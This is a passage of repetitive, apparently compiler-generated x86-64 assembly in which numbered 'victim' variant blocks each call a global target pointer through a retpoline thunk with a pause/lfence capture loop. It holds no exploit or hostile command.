	jmp	.Lvictim_win0_continue
## Variant 470
.Lvictim_win0_var470:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000470
	jmp	.Lgg_retpol_after_000470
.Lgg_retpol_thunk_000470:
	callq	.Lgg_retpol_setup_000470
.Lgg_retpol_cap_000470:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000470
.Lgg_retpol_setup_000470:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000470:
	jmp	.Lvictim_win0_continue
## Variant 471
.Lvictim_win0_var471:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000471
	jmp	.Lgg_retpol_after_000471
.Lgg_retpol_thunk_000471:
	callq	.Lgg_retpol_setup_000471
.Lgg_retpol_cap_000471:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000471
.Lgg_retpol_setup_000471:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000471:
	jmp	.Lvictim_win0_continue
## Variant 472
.Lvictim_win0_var472:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000472
	jmp	.Lgg_retpol_after_000472
.Lgg_retpol_thunk_000472:
	callq	.Lgg_retpol_setup_000472
.Lgg_retpol_cap_000472:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000472
.Lgg_retpol_setup_000472:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000472:
	jmp	.Lvictim_win0_continue
## Variant 473
.Lvictim_win0_var473:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000473
	jmp	.Lgg_retpol_after_000473
.Lgg_retpol_thunk_000473:
	callq	.Lgg_retpol_setup_000473
.Lgg_retpol_cap_000473:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000473
.Lgg_retpol_setup_000473:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000473:
	jmp	.Lvictim_win0_continue
## Variant 474
.Lvictim_win0_var474:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000474
	jmp	.Lgg_retpol_after_000474
.Lgg_retpol_thunk_000474:
	callq	.Lgg_retpol_setup_000474
.Lgg_retpol_cap_000474:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000474
.Lgg_retpol_setup_000474:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000474:
	jmp	.Lvictim_win0_continue
## Variant 475
.Lvictim_win0_var475:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000475
	jmp	.Lgg_retpol_after_000475
.Lgg_retpol_thunk_000475:
	callq	.Lgg_retpol_setup_000475
.Lgg_retpol_cap_000475:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000475
.Lgg_retpol_setup_000475:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000475:
	jmp	.Lvictim_win0_continue
## Variant 476
.Lvictim_win0_var476:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000476
	jmp	.Lgg_retpol_after_000476
.Lgg_retpol_thunk_000476:
	callq	.Lgg_retpol_setup_000476
.Lgg_retpol_cap_000476:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000476
.Lgg_retpol_setup_000476:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000476:
	jmp	.Lvictim_win0_continue
## Variant 477
.Lvictim_win0_var477:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000477
	jmp	.Lgg_retpol_after_000477
.Lgg_retpol_thunk_000477:
	callq	.Lgg_retpol_setup_000477
.Lgg_retpol_cap_000477:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000477
.Lgg_retpol_setup_000477:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000477:
	jmp	.Lvictim_win0_continue
## Variant 478
.Lvictim_win0_var478:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000478
	jmp	.Lgg_retpol_after_000478
.Lgg_retpol_thunk_000478:
	callq	.Lgg_retpol_setup_000478
.Lgg_retpol_cap_000478:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000478
.Lgg_retpol_setup_000478:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000478:
	jmp	.Lvictim_win0_continue
## Variant 479
.Lvictim_win0_var479:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000479
	jmp	.Lgg_retpol_after_000479
.Lgg_retpol_thunk_000479:
	callq	.Lgg_retpol_setup_000479
.Lgg_retpol_cap_000479:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000479
.Lgg_retpol_setup_000479:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000479:
	jmp	.Lvictim_win0_continue
## Variant 480
.Lvictim_win0_var480:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000480
	jmp	.Lgg_retpol_after_000480
.Lgg_retpol_thunk_000480:
	callq	.Lgg_retpol_setup_000480
.Lgg_retpol_cap_000480:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000480
.Lgg_retpol_setup_000480:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000480:
	jmp	.Lvictim_win0_continue
## Variant 481
.Lvictim_win0_var481:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000481
	jmp	.Lgg_retpol_after_000481
.Lgg_retpol_thunk_000481:
	callq	.Lgg_retpol_setup_000481
.Lgg_retpol_cap_000481:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000481
.Lgg_retpol_setup_000481:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000481:
	jmp	.Lvictim_win0_continue
## Variant 482
.Lvictim_win0_var482:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000482
	jmp	.Lgg_retpol_after_000482
.Lgg_retpol_thunk_000482:
	callq	.Lgg_retpol_setup_000482
.Lgg_retpol_cap_000482:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000482
.Lgg_retpol_setup_000482:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000482:
	jmp	.Lvictim_win0_continue
## Variant 483
.Lvictim_win0_var483:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000483
	jmp	.Lgg_retpol_after_000483
.Lgg_retpol_thunk_000483:
	callq	.Lgg_retpol_setup_000483
.Lgg_retpol_cap_000483:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000483
.Lgg_retpol_setup_000483:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000483:
	jmp	.Lvictim_win0_continue
## Variant 484
.Lvictim_win0_var484:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000484
	jmp	.Lgg_retpol_after_000484
.Lgg_retpol_thunk_000484:
	callq	.Lgg_retpol_setup_000484
.Lgg_retpol_cap_000484:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000484
.Lgg_retpol_setup_000484:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000484:
	jmp	.Lvictim_win0_continue
## Variant 485
.Lvictim_win0_var485:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000485
	jmp	.Lgg_retpol_after_000485
.Lgg_retpol_thunk_000485:
	callq	.Lgg_retpol_setup_000485
.Lgg_retpol_cap_000485:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000485
.Lgg_retpol_setup_000485:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000485:
	jmp	.Lvictim_win0_continue
## Variant 486
.Lvictim_win0_var486:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000486
	jmp	.Lgg_retpol_after_000486
.Lgg_retpol_thunk_000486:
	callq	.Lgg_retpol_setup_000486
.Lgg_retpol_cap_000486:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000486
.Lgg_retpol_setup_000486:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000486:
	jmp	.Lvictim_win0_continue
## Variant 487
.Lvictim_win0_var487:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000487
	jmp	.Lgg_retpol_after_000487
.Lgg_retpol_thunk_000487:
	callq	.Lgg_retpol_setup_000487
.Lgg_retpol_cap_000487:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000487
.Lgg_retpol_setup_000487:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000487:
	jmp	.Lvictim_win0_continue
## Variant 488
.Lvictim_win0_var488:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000488
	jmp	.Lgg_retpol_after_000488
.Lgg_retpol_thunk_000488:
	callq	.Lgg_retpol_setup_000488
.Lgg_retpol_cap_000488:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000488
.Lgg_retpol_setup_000488:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000488:
	jmp	.Lvictim_win0_continue
## Variant 489
.Lvictim_win0_var489:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000489
	jmp	.Lgg_retpol_after_000489
.Lgg_retpol_thunk_000489:
	callq	.Lgg_retpol_setup_000489
.Lgg_retpol_cap_000489:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000489
.Lgg_retpol_setup_000489:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000489:
	jmp	.Lvictim_win0_continue
## Variant 490
.Lvictim_win0_var490:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000490
	jmp	.Lgg_retpol_after_000490
.Lgg_retpol_thunk_000490:
	callq	.Lgg_retpol_setup_000490
.Lgg_retpol_cap_000490:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000490
.Lgg_retpol_setup_000490:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000490:
	jmp	.Lvictim_win0_continue
## Variant 491
.Lvictim_win0_var491:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000491
	jmp	.Lgg_retpol_after_000491
.Lgg_retpol_thunk_000491:
	callq	.Lgg_retpol_setup_000491
.Lgg_retpol_cap_000491:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000491
.Lgg_retpol_setup_000491:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000491:
	jmp	.Lvictim_win0_continue
## Variant 492
.Lvictim_win0_var492:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000492
	jmp	.Lgg_retpol_after_000492
.Lgg_retpol_thunk_000492:
	callq	.Lgg_retpol_setup_000492
.Lgg_retpol_cap_000492:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000492
.Lgg_retpol_setup_000492:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000492:
	jmp	.Lvictim_win0_continue
## Variant 493
.Lvictim_win0_var493:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000493
	jmp	.Lgg_retpol_after_000493
.Lgg_retpol_thunk_000493:
	callq	.Lgg_retpol_setup_000493
.Lgg_retpol_cap_000493:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000493
.Lgg_retpol_setup_000493:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000493:
	jmp	.Lvictim_win0_continue
## Variant 494
.Lvictim_win0_var494:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000494
	jmp	.Lgg_retpol_after_000494
.Lgg_retpol_thunk_000494:
	callq	.Lgg_retpol_setup_000494
.Lgg_retpol_cap_000494:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000494
.Lgg_retpol_setup_000494:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000494:
	jmp	.Lvictim_win0_continue
## Variant 495
.Lvictim_win0_var495:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000495
	jmp	.Lgg_retpol_after_000495
.Lgg_retpol_thunk_000495:
	callq	.Lgg_retpol_setup_000495
.Lgg_retpol_cap_000495:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000495
.Lgg_retpol_setup_000495:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000495:
	jmp	.Lvictim_win0_continue
## Variant 496
.Lvictim_win0_var496:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000496
	jmp	.Lgg_retpol_after_000496
.Lgg_retpol_thunk_000496:
	callq	.Lgg_retpol_setup_000496
.Lgg_retpol_cap_000496:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000496
.Lgg_retpol_setup_000496:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000496:
	jmp	.Lvictim_win0_continue
## Variant 497
.Lvictim_win0_var497:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000497
	jmp	.Lgg_retpol_after_000497
.Lgg_retpol_thunk_000497:
	callq	.Lgg_retpol_setup_000497
.Lgg_retpol_cap_000497:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000497
.Lgg_retpol_setup_000497:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000497:
	jmp	.Lvictim_win0_continue
## Variant 498
.Lvictim_win0_var498:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000498
	jmp	.Lgg_retpol_after_000498
.Lgg_retpol_thunk_000498:
	callq	.Lgg_retpol_setup_000498
.Lgg_retpol_cap_000498:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000498
.Lgg_retpol_setup_000498:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000498:
	jmp	.Lvictim_win0_continue
## Variant 499
.Lvictim_win0_var499:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000499
	jmp	.Lgg_retpol_after_000499
.Lgg_retpol_thunk_000499:
	callq	.Lgg_retpol_setup_000499
.Lgg_retpol_cap_000499:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000499
.Lgg_retpol_setup_000499:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000499:
	jmp	.Lvictim_win0_continue
## Variant 500
.Lvictim_win0_var500:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000500
	jmp	.Lgg_retpol_after_000500
.Lgg_retpol_thunk_000500:
	callq	.Lgg_retpol_setup_000500
.Lgg_retpol_cap_000500:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000500
.Lgg_retpol_setup_000500:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000500:
	jmp	.Lvictim_win0_continue
## Variant 501
.Lvictim_win0_var501:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000501
	jmp	.Lgg_retpol_after_000501
.Lgg_retpol_thunk_000501:
	callq	.Lgg_retpol_setup_000501
.Lgg_retpol_cap_000501:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000501
.Lgg_retpol_setup_000501:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000501:
	jmp	.Lvictim_win0_continue
## Variant 502
.Lvictim_win0_var502:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000502
	jmp	.Lgg_retpol_after_000502
.Lgg_retpol_thunk_000502:
	callq	.Lgg_retpol_setup_000502
.Lgg_retpol_cap_000502:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000502
.Lgg_retpol_setup_000502:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000502:
	jmp	.Lvictim_win0_continue
## Variant 503
.Lvictim_win0_var503:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000503
	jmp	.Lgg_retpol_after_000503
.Lgg_retpol_thunk_000503:
	callq	.Lgg_retpol_setup_000503
.Lgg_retpol_cap_000503:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000503
.Lgg_retpol_setup_000503:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000503:
	jmp	.Lvictim_win0_continue
## Variant 504
.Lvictim_win0_var504:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000504
	jmp	.Lgg_retpol_after_000504
.Lgg_retpol_thunk_000504:
	callq	.Lgg_retpol_setup_000504
.Lgg_retpol_cap_000504:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000504
.Lgg_retpol_setup_000504:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000504:
	jmp	.Lvictim_win0_continue
## Variant 505
.Lvictim_win0_var505:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000505
	jmp	.Lgg_retpol_after_000505
.Lgg_retpol_thunk_000505:
	callq	.Lgg_retpol_setup_000505
.Lgg_retpol_cap_000505:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000505
.Lgg_retpol_setup_000505:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000505:
	jmp	.Lvictim_win0_continue
## Variant 506
.Lvictim_win0_var506:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000506
	jmp	.Lgg_retpol_after_000506
.Lgg_retpol_thunk_000506:
	callq	.Lgg_retpol_setup_000506
.Lgg_retpol_cap_000506:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000506
.Lgg_retpol_setup_000506:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000506:
	jmp	.Lvictim_win0_continue
## Variant 507
.Lvictim_win0_var507:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000507
	jmp	.Lgg_retpol_after_000507
.Lgg_retpol_thunk_000507:
	callq	.Lgg_retpol_setup_000507
.Lgg_retpol_cap_000507:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000507
.Lgg_retpol_setup_000507:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000507:
	jmp	.Lvictim_win0_continue
## Variant 508
.Lvictim_win0_var508:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000508
	jmp	.Lgg_retpol_after_000508
.Lgg_retpol_thunk_000508:
	callq	.Lgg_retpol_setup_000508
.Lgg_retpol_cap_000508:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000508
.Lgg_retpol_setup_000508:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000508:
	jmp	.Lvictim_win0_continue
## Variant 509
.Lvictim_win0_var509:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000509
	jmp	.Lgg_retpol_after_000509
.Lgg_retpol_thunk_000509:
	callq	.Lgg_retpol_setup_000509
.Lgg_retpol_cap_000509:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000509
.Lgg_retpol_setup_000509:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000509:
	jmp	.Lvictim_win0_continue
## Variant 510
.Lvictim_win0_var510:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000510
	jmp	.Lgg_retpol_after_000510
.Lgg_retpol_thunk_000510:
	callq	.Lgg_retpol_setup_000510
.Lgg_retpol_cap_000510:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000510
.Lgg_retpol_setup_000510:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000510:
	jmp	.Lvictim_win0_continue
## Variant 511
.Lvictim_win0_var511:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000511
	jmp	.Lgg_retpol_after_000511
.Lgg_retpol_thunk_000511:
	callq	.Lgg_retpol_setup_000511
.Lgg_retpol_cap_000511:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000511
.Lgg_retpol_setup_000511:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000511:
	jmp	.Lvictim_win0_continue
## Variant 512
.Lvictim_win0_var512:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000512
	jmp	.Lgg_retpol_after_000512
.Lgg_retpol_thunk_000512:
	callq	.Lgg_retpol_setup_000512
.Lgg_retpol_cap_000512:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000512
.Lgg_retpol_setup_000512:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000512:
	jmp	.Lvictim_win0_continue
## Variant 513
.Lvictim_win0_var513:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000513
	jmp	.Lgg_retpol_after_000513
.Lgg_retpol_thunk_000513:
	callq	.Lgg_retpol_setup_000513
.Lgg_retpol_cap_000513:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000513
.Lgg_retpol_setup_000513:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000513:
	jmp	.Lvictim_win0_continue
## Variant 514
.Lvictim_win0_var514:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000514
	jmp	.Lgg_retpol_after_000514
.Lgg_retpol_thunk_000514:
	callq	.Lgg_retpol_setup_000514
.Lgg_retpol_cap_000514:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000514
.Lgg_retpol_setup_000514:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000514:
	jmp	.Lvictim_win0_continue
## Variant 515
.Lvictim_win0_var515:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000515
	jmp	.Lgg_retpol_after_000515
.Lgg_retpol_thunk_000515:
	callq	.Lgg_retpol_setup_000515
.Lgg_retpol_cap_000515:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000515
.Lgg_retpol_setup_000515:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000515:
	jmp	.Lvictim_win0_continue
## Variant 516
.Lvictim_win0_var516:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000516
	jmp	.Lgg_retpol_after_000516
.Lgg_retpol_thunk_000516:
	callq	.Lgg_retpol_setup_000516
.Lgg_retpol_cap_000516:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000516
.Lgg_retpol_setup_000516:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000516:
	jmp	.Lvictim_win0_continue
## Variant 517
.Lvictim_win0_var517:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000517
	jmp	.Lgg_retpol_after_000517
.Lgg_retpol_thunk_000517:
	callq	.Lgg_retpol_setup_000517
.Lgg_retpol_cap_000517:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000517
.Lgg_retpol_setup_000517:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000517:
	jmp	.Lvictim_win0_continue
## Variant 518
.Lvictim_win0_var518:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000518
	jmp	.Lgg_retpol_after_000518
.Lgg_retpol_thunk_000518:
	callq	.Lgg_retpol_setup_000518
.Lgg_retpol_cap_000518:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000518
.Lgg_retpol_setup_000518:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000518:
	jmp	.Lvictim_win0_continue
## Variant 519
.Lvictim_win0_var519:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000519
	jmp	.Lgg_retpol_after_000519
.Lgg_retpol_thunk_000519:
	callq	.Lgg_retpol_setup_000519
.Lgg_retpol_cap_000519:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000519
.Lgg_retpol_setup_000519:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000519:
	jmp	.Lvictim_win0_continue
## Variant 520
.Lvictim_win0_var520:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000520
	jmp	.Lgg_retpol_after_000520
.Lgg_retpol_thunk_000520:
	callq	.Lgg_retpol_setup_000520
.Lgg_retpol_cap_000520:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000520
.Lgg_retpol_setup_000520:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000520:
	jmp	.Lvictim_win0_continue
## Variant 521
.Lvictim_win0_var521:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000521
	jmp	.Lgg_retpol_after_000521
.Lgg_retpol_thunk_000521:
	callq	.Lgg_retpol_setup_000521
.Lgg_retpol_cap_000521:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000521
.Lgg_retpol_setup_000521:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000521:
	jmp	.Lvictim_win0_continue
## Variant 522
.Lvictim_win0_var522:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
